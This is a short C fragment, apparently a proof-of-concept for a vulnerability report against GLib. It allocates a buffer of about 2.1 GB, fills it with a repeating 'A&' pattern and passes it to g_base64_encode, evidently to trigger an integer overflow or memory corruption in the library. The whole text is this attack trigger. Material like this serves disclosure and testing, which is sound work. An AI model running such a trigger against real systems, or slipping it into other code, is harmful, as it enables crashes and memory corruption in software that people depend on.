{
    g_print("GLib Version: %d.%d.%d\n", GLIB_MAJOR_VERSION, GLIB_MINOR_VERSION, GLIB_MICRO_VERSION);
    size_t l=2147484000;
    char* uri_str_mu=(char*)g_malloc(l);
    char tmp[10000];
    for(size_t i=0;i<10000;i+=2)
    {
       tmp[i]='A';
       tmp[i+1]='&';
    }   
    for(size_t i=0;i<l/10000;i++)
    {
       memcpy(uri_str_mu+i*10000,tmp,10000);
    }
    uri_str_mu[l-1]=0;
    g_base64_encode (uri_str_mu,strlen(uri_str_mu));
    return 1;
